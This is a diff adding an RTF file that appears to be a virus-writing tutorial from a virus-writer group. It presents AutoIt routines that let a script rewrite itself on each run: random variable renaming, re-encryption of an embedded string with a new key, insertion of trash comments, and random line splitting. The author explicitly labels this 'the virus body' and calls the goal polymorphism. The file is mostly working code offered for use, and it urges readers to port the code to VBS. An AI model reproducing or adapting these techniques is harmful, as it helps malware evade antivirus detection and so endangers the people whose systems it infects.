+    \cf9\b for\cf1\b0  \cf5\b $x\cf2 =\cf3\i 1\cf1\b0\i0  \cf9\b to\cf1\b0  \cf8\b\i random\cf2\i0 (\cf3\i 6\cf2\i0 ,\cf3\i 12\cf2\i0 ,\cf3\i 1\cf2\i0 )\cf1\b0\par
+        \cf5\b $var\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $var\cf1\b0  \cf2\b &\cf1\b0  \cf8\b\i Chr\cf2\i0 (\cf8\i random\cf2\i0 (\cf3\i 97\cf2\i0 ,\cf3\i 122\cf2\i0 ,\cf3\i 1\cf2\i0 ))\cf1\b0                                        \cf4\i ;create a new random sized variable\par
+\cf1\i0                                                                                   \cf4\i ;this can be improved alot!\par
+\cf1\i0     \cf9\b next\cf1\b0\par
+    \cf5\b $readhost\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i StringReplace\cf2\i0 (\cf5 $readhost\cf2 ,\cf1\b0  \cf5\b $avArray\cf2 [\cf5 $i\cf2 ],\cf1\b0  \cf5\b $var\cf2 )\cf1\b0                       \cf4\i ;replace with new variable\par
+\cf9\b\i0 Next\cf1\b0\par
+   \par
+\cf5\b $rewrite\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf3\i 2\cf2\i0 )\cf1\b0\par
+\cf8\b\i FileWrite\cf2\i0 (\cf5 $rewrite\cf2 ,\cf1\b0  \cf5\b $readhost\cf2 )\cf1\b0                                                     \cf4\i ;rewrite with new code\par
+\cf8\b FileClose\cf2\i0 (\cf5 $rewrite\cf2 )\cf1\b0\par
+\par
+\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\cf2\b ++++\cf1\b0 Randomized \cf8\b\i String\cf1\b0\i0  Encryption\cf2\b ++++--------------------------------------------------------------------------------------\cf1\b0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\par
+\par
+\cf5\b $self\cf2 =\cf6 @ScriptName\cf1\b0                                                                  \cf4\i ;get the script name\par
+\cf5\b\i0 $readhost\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0\par
+\cf9\b If\cf1\b0  \cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b then\cf1\b0  \cf9\b ExitLoop\cf1\b0\par
+    \cf5\b $readhost\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileRead\cf2\i0 (\cf5 $host\cf2 ,\cf1\b0  \cf8\b\i FileGetSize\cf2\i0 (\cf5 $self\cf2 ))\cf1\b0                                \cf4\i ;read everything into the variable\par
+\cf8\b FileClose\cf2\i0 (\cf5 $host\cf2 )\cf1\b0\par
+\cf5\b $code\cf2 =\cf7\f1 "\'d0\'bf\'cc\'c2\'cd\'cb\'c7\'d8\'c3\'c2~\'d1\'d2\'d0\'c7\'cc\'c5~\'c3\'cc\'c1\'d0\'d7\'ce\'d2\'c7\'cd\'cc94"\cf1\b0\f0                                             \cf4\i ;the encrypted string with key appended\par
+\cf5\b\i0 $original\cf2 =\cf5 $code\cf1\b0  \lang2057\f1                                                                   \cf4\lang1033\i\f0 ;original code\par
+\cf5\b\i0 $key\cf2 =\cf8\i StringMid\cf2\i0 (\cf5 $code\cf2 ,\cf1\b0  \cf8\b\i stringlen\cf2\i0 (\cf5 $code\cf2 )-\cf3\i 1\cf2\i0 ,\cf1\b0  \cf8\b\i stringlen\cf2\i0 (\cf5 $code\cf2 ))\cf1\b0                        \cf4\i ;get the decryption key\par
+\cf5\b\i0 $decrypt\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $de\cf2 =\cf7 ""\cf1\b0\par
+\cf9\b For\cf1\b0  \cf5\b $i\cf2 =\cf3\i 1\cf1\b0\i0  \cf9\b to\cf1\b0  \cf8\b\i StringLen\cf2\i0 (\cf5 $code\cf2 )\cf1\b0\par
+    \cf5\b $de\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i Asc\cf2\i0 (\cf8\i StringMid\cf2\i0 (\cf5 $code\cf2 ,\cf1\b0  \cf5\b $i\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 ))\cf1\b0  \cf2\b -\cf1\b0  \cf5\b $key\cf1\b0                                      \cf4\i ;decrypt using key\par
+\cf1\i0     \cf5\b $decrypt\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $decrypt\cf1\b0  \cf2\b &\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf5 $de\cf2 )\cf1\b0\par
+\cf9\b Next\cf1\b0\par
+\cf5\b $mycode\cf2 =\cf8\i StringMid\cf2\i0 (\cf5 $decrypt\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 ,\cf1\b0  \cf8\b\i stringlen\cf2\i0 (\cf5 $decrypt\cf2 )-\cf3\i 2\cf2\i0 )\cf1\b0                              \cf4\i ;remove old key\par
+\cf8\b MsgBox\cf2\i0 (\cf3\i 0\cf2\i0 ,\cf1\b0  \cf7\b ""\cf2 ,\cf1\b0  \cf5\b $mycode\cf2 )\cf1\b0                                                             \cf4\i ;good for debugging\par
+\cf5\b\i0 $rndkey\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i Random\cf2\i0 (\cf3\i 10\cf2\i0 ,\cf3\i 99\cf2\i0 ,\cf3\i 1\cf2\i0 )\cf1\b0                                                          \cf4\i ;get a new random key\par
+\cf5\b\i0 $str\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $en\cf2 =\cf7 ""\cf1\b0\par
+\cf9\b For\cf1\b0  \cf5\b $i\cf2 =\cf3\i 1\cf1\b0\i0  \cf9\b to\cf1\b0  \cf8\b\i StringLen\cf2\i0 (\cf5 $mycode\cf2 )\cf1\b0\par
+    \cf5\b $str\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i Asc\cf2\i0 (\cf8\i StringMid\cf2\i0 (\cf5 $mycode\cf2 ,\cf1\b0  \cf5\b $i\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 ))\cf1\b0  \cf2\b +\cf1\b0  \cf5\b $rndkey\cf1\b0                                \cf4\i ;encrypt with new key\par
+\cf1\i0     \cf5\b $en\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $en\cf1\b0  \cf2\b &\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf5 $str\cf2 )\cf1\b0\par
+\cf9\b Next\cf1\b0\par
+\cf5\b $new\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i StringReplace\cf2\i0 (\cf5 $code\cf2 ,\cf1\b0  \cf5\b $code\cf2 ,\cf1\b0  \cf5\b $en\cf2 )\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $rndkey\cf1\b0                                  \cf4\i ;replace old encrypted string with new\par
+\cf5\b\i0 $newstr\cf2 =\cf8\i StringReplace\cf2\i0 (\cf5 $readhost\cf2 ,\cf1\b0  \cf5\b $original\cf2 ,\cf1\b0  \cf5\b $new\cf2 )\cf1\b0                                  \cf4\i ;replace it in the virus code\par
+\cf5\b\i0 $replace\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf3\i 2\cf2\i0 )\cf1\b0\par
+\cf8\b\i FileWrite\cf2\i0 (\cf5 $replace\cf2 ,\cf1\b0  \cf5\b $newstr\cf2 )\cf1\b0                                                       \cf4\i ;complete!\par
+\cf8\b FileClose\cf2\i0 (\cf5 $replace\cf2 )\cf1\b0\par
+\par
+actually the idea is to encrypt the virus body so it changes like polymorphism while also being encrypted.\par
+but this is good for an example i guess..\cf4\i\par
+\cf1\i0\par
+\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\cf2\b ++++++++\cf1\b0 Adding Trash \cf9\b to\cf1\b0  code\cf2\b ++++++++--------------------------------------------------------------------------------------\cf1\b0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\par
+\cf5\b $self\cf2 =\cf6 @ScriptName\cf1\b0                                                                   \cf4\i ;get self name\par
+\cf5\b\i0 $line\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $virus\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $me\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0                                                            \cf4\i ;open self\par
+\cf9\b\i0 while\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $me\cf2 )\cf1\b0  \lang2057\f1                                                      \cf4\lang1033\i\f0 ;read line\par
+\cf1\i0     \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0                                                    \cf4\i ;exit EOF\par
+\cf1\i0     \cf9\b if\cf1\b0  \cf8\b\i random\cf2\i0 (\cf3\i 1\cf2\i0 ,\cf3\i 2\cf2\i0 ,\cf3\i 1\cf2\i0 )\cf1\b0  \cf2\b =\cf1\b0  \cf3\b\i 2\cf1\b0\i0  \cf9\b then\cf1\b0                                                       \cf4\i ;should it insert trash here?\par
+\cf1\i0         \cf5\b $trash\cf2 =\cf7 ""\cf1\b0\par
+        \cf9\b For\cf1\b0  \cf5\b $i\cf1\b0  \cf2\b =\cf1\b0  \cf3\b\i 1\cf1\b0\i0  \cf9\b to\cf1\b0  \cf8\b\i random\cf2\i0 (\cf3\i 30\cf2\i0 ,\cf3\i 100\cf2\i0 ,\cf3\i 1\cf2\i0 )\cf1\b0                                              \cf4\i ;random size 30 to 100 cheracters\par
+\cf1\i0             \cf5\b $trash\cf2 =\cf5 $trash\cf1\b0  \cf2\b &\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf8\i random\cf2\i0 (\cf3\i 50\cf2\i0 ,\cf3\i 97\cf2\i0 ,\cf3\i 1\cf2\i0 ))\cf1\b0                                    \cf4\i ;generate trash\par
+\cf1\i0         \cf9\b next\cf1\b0\par
+        \cf5\b $line\cf2 =\cf5 $line\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf7\b ";"\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $trash\cf1\b0                                          \cf4\i ;insert trash\par
+\cf1\i0     \cf9\b EndIf\cf1\b0\par
+    \cf9\b If\cf1\b0  \cf8\b\i StringMid\cf2\i0 (\cf5 $line\cf2 ,\cf3\i 1\cf2\i0 ,\cf3\i 1\cf2\i0 )\cf1\b0  \cf2\b <>\cf1\b0  \cf7\b ";"\cf1\b0  \cf9\b then\cf1\b0\par
+        \cf5\b $virus\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $virus\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $line\cf1\b0                                             \cf4\i ;build the new virus body\par
+\cf1\i0     \cf9\b EndIf\cf1\b0\par
+\cf9\b Wend\cf1\b0\par
+\cf8\b\i FileClose\cf2\i0 (\cf5 $me\cf2 )\cf1\b0\par
+\par
+\cf5\b $rewrite\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf3\i 2\cf2\i0 )\cf1\b0\par
+\cf8\b\i FileWrite\cf2\i0 (\cf5 $rewrite\cf2 ,\cf1\b0  \cf5\b $virus\cf2 )\cf1\b0                                                         \cf4\i ;rewrite with new code\par
+\cf8\b FileClose\cf2\i0 (\cf5 $rewrite\cf2 )\cf1\b0\par
+\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\cf2\b +++++++++++\cf1\b0 Breaking Lines\cf2\b +++++++++++--------------------------------------------------------------------------------------\cf1\b0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\par
+I'm gussing you've not seen this method befor\lang2057\f1 e\lang1033\f0 ? but if so then here it is again.\cf4\i\par
+\cf1\i0\par
+\cf5\b $curline\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $rem\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $restore\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $NewCode\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $me\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf6 @ScriptName\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0                                                      \cf4\i ;open self for reading\par
+\cf9\b\i0 while\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $curline\cf2 =\cf8\i FileReadLine\cf2\i0 (\cf5 $me\cf2 )\cf1\b0  \lang2057\f1                                                     \cf4\lang1033\i\f0 ;read the first line\par
+\cf1\i0     \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0  \lang2057\f1                                                   \cf4\lang1033\i\f0 ;exit at EOF\par
+\cf1\i0     \cf9\b FOR\cf1\b0  \cf5\b $i\cf1\b0  \cf2\b =\cf1\b0  \cf3\b\i 1\cf1\b0\i0  \cf9\b to\cf1\b0  \cf3\b\i 20\cf1\b0\i0                                                                \cf4\i ;some things i just cant explain!\par
+\cf1\i0         \cf9\b IF\cf1\b0  \cf8\b\i StringInStr\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf3\i 95\cf2\i0 ))\cf1\b0  \cf9\b then\cf1\b0                                      \cf4\i ;check if there is an underscore in this line\par
+\cf1\i0             \cf5\b $rem\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i stringmid\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 ,\cf1\b0  \cf8\b\i StringInStr\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf3\i 95\cf2\i0 ))\cf1\b0  \cf2\b -\cf1\b0  \cf3\b\i 1\cf2\i0 )\cf1\b0       \cf4\i ;remove the underscore\par
+\cf1\i0             \cf5\b $restore\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $rem\cf1\b0  \cf2\b &\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $me\cf2 )\cf1\b0                                     \cf4\i ;join the line back together\par
+\cf1\i0             \cf5\b $curline\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $restore\cf1\b0                                                     \cf4\i ;set curline back to its normal self\par
+\cf1\i0         \cf9\b ENDIF\cf1\b0\par
+    \cf9\b NEXT\cf1\b0\par
+      \par
+    \cf5\b $curline\cf1\b0  \cf2\b =\cf1\b0  DoSplit\cf2\b (\cf5 $curline\cf2 )\cf1\b0                                                    \cf4\i ;call function to do the line splitting\par
+\cf1\i0     \cf5\b $NewCode\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $NewCode\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $curline\cf1\b0  \lang2057\f1                                         \cf4\lang1033\i\f0 ;build the new code\par
+\cf9\b\i0 wend\cf1\b0\par
+\cf8\b\i FileClose\cf2\i0 (\cf5 $me\cf2 )\cf1\b0\par
+\par
+\cf5\b $rewrite\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf6 @ScriptName\cf2 ,\cf1\b0  \cf3\b\i 2\cf2\i0 )\cf1\b0                                                 \cf4\i ;open self for writing\par
+\cf8\b FileWrite\cf2\i0 (\cf5 $rewrite\cf2 ,\cf1\b0  \cf5\b $NewCode\cf2 )\cf1\b0                                                       \cf4\i ;rewrite with new code\par
+\cf8\b FileClose\cf2\i0 (\cf5 $rewrite\cf2 )\cf1\b0                                                                 \cf4\i ;close.\par
+\cf1\i0\par
+\cf9\b Func\cf1\b0  DoSplit\cf2\b (\cf5 $line\cf2 )\cf1\b0                                                                 \cf4\i ;entry point of splitting function\par
+\cf1\i0   \cf9\b DIM\cf1\b0  \cf5\b $pos\cf2 ,\cf5 $pr1\cf2 ,\cf5 $pr2\cf2 ,\cf5 $add\cf2 ,\cf5 $m\cf2 =\cf7 ""\cf1\b0                                                     \cf4\i ;setup some variables\par
+\cf1\i0   \cf9\b FOR\cf1\b0  \cf5\b $i\cf1\b0  \cf2\b =\cf1\b0  \cf3\b\i 1\cf1\b0\i0  \cf9\b to\cf1\b0  \cf8\b\i stringlen\cf2\i0 (\cf5 $line\cf2 )\cf1\b0                                                    \cf4\i ;loop through the line\par
+\cf1\i0       \cf5\b $m\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i stringmid\cf2\i0 (\cf5 $line\cf2 ,\cf1\b0  \cf5\b $i\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 )\cf1\b0                                                  \cf4\i ;get the current character\par
+\cf1\i0       \cf9\b IF\cf1\b0  \cf5\b $m\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf3\i 44\cf2\i0 )\cf1\b0  \cf9\b OR\cf1\b0  \cf5\b $m\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf3\i 61\cf2\i0 )\cf1\b0  \cf9\b OR\cf1\b0  \cf5\b $m\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf3\i 38\cf2\i0 )\cf1\b0  \cf9\b then\cf1\b0                          \cf4\i ;check if its anything we can use\par
+\cf1\i0             \cf5\b $pr1\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i stringmid\cf2\i0 (\cf5 $line\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 ,\cf1\b0  \cf5\b $i\cf2 )\cf1\b0                                          \cf4\i ;get the line from start to pos of $m\par
+\cf1\i0             \cf5\b $pr2\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i stringmid\cf2\i0 (\cf5 $line\cf2 ,\cf1\b0  \cf5\b $i\cf2 +\cf3\i 1\cf2\i0 ,\cf1\b0  \cf8\b\i stringlen\cf2\i0 (\cf5 $line\cf2 ))\cf1\b0                         \cf4\i ;other half from $m to end of line\par
+\cf1\i0             \cf9\b IF\cf1\b0  \cf8\b\i Random\cf2\i0 (\cf3\i 1\cf2\i0 ,\cf3\i 2\cf2\i0 ,\cf3\i 1\cf2\i0 )\cf1\b0  \cf2\b =\cf1\b0  \cf3\b\i 2\cf1\b0\i0  \cf9\b THEN\cf1\b0  \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $pr1\cf1\b0  \cf2\b &\cf1\b0  \cf7\b " "\cf1\b0  \cf2\b &\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf3\i 95\cf2\i0 )\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $pr2\cf1\b0   \cf4\i ;if rnd is 2 then split the line into 2 \par
+\cf1\i0\par
+parts\par
+      \cf9\b ENDIF\cf1\b0\par
+  \cf9\b NEXT\cf1\b0\par
+\cf9\b Return\cf1\b0  \cf5\b $line\cf1\b0                                                                         \cf4\i ;return the new line\par
+\cf9\b\i0 EndFunc\cf1\b0\par
+\par
+\cf4\i ;here is an example of what this method can do:\par
+;a line of code can look like this:\par
+\cf8\b stringmid\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 ,\cf1\b0  \cf8\b\i StringInStr\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf3\i 95\cf2\i0 ))\cf1\b0  \cf2\b -\cf1\b0  \cf3\b\i 1\cf2\i0 )\cf1\b0\par
+\cf4\i ;it can also look like this\par
+\cf8\b stringmid\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 ,\cf1\b0  \cf2\b _\cf1\b0\par
+\cf8\b\i StringInStr\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf8\b\i chr\cf2\i0 (\cf3\i 95\cf2\i0 ))\cf1\b0  \cf2\b -\cf1\b0  \cf3\b\i 1\cf2\i0 )\cf1\b0  \par
+\cf4\i ;or this:\par
+\cf8\b stringmid\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf2\b _\cf1\b0\par
+\cf3\b\i 1\cf2\i0 ,\cf1\b0  \cf8\b\i StringInStr\cf2\i0 (\cf5 $curline\cf2 ,\cf1\b0  \cf2\b _\cf1\b0\par
+\cf8\b\i chr\cf2\i0 (\cf3\i 95\cf2\i0 ))\cf1\b0  \cf2\b -\cf1\b0  \cf3\b\i 1\cf2\i0 )\cf1\b0\par
+\cf4\i ;and so on..\par
+\cf1\i0\par
+so each time the code is executed it will add a continuation character "_" in random locations only if\par
+this location supports a contuniation.. anything after these characters (. , &) will allow an underscore "_".\par
+Splitting 1 line into 2 parts or more.. or join them back to form a single line.. kinda really simple stuff! \par
+You should try this to understand it better, it's easy to rewrite into VBS and everyone knows vbs dont they?\cf4\i\par
+\cf1\i0\par
+\cf2\b -------------------------------------------------------------------------------------------------------------------------\cf1\b0\par
+\par
+\lang2057\b\f1 CREDITS! \par
+\b0 Kefi              - im still awaiting an email from you!\par
+retr0             - BUZZ! \par
+free0n            - puts dances around a lamb pole :p\par
+synge             - i forgive you for your evil deeds.\par
+slagehammer       - thx for all the asm sources it's just what i needed! yays! jmp dr3f\par
+dr3f:             mov irc,[you] \par
+And hello's to everyone in DoomRiderz and anyone else missing, i just want to get this over with!\par
+\lang1033\f0\par
+\lang2057\f1 ps:\par
+i had this strange idea of polymorphism of a kind.. encrypting/decrypting random lines.. i had some success but then\par
+got busy with "real life" (yes synge i have 1 :p) so someone else can try this if they think it's worth it.\par
+\lang1033\f0\par
+Thats all hope you enjoyed!\par
+byez!\par
+}
+ 
